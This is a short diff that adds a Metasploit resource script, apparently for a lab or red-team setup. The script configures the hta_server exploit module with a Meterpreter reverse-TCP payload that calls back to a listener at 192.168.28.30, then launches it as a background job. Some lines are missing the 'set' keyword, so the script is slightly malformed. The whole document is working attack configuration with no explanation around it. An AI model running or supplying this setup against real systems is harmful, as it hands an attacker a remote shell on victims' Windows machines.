@@ -1,0 +1,8 @@
+use windows/misc/hta_server
+set SRVHOST  0.0.0.0
+set SRVPORT  4444
+URIPATH  /
+set payload windows/meterpreter/reverse_tcp
+LHOST     192.168.28.30
+LPORT     4445
+run -j -z
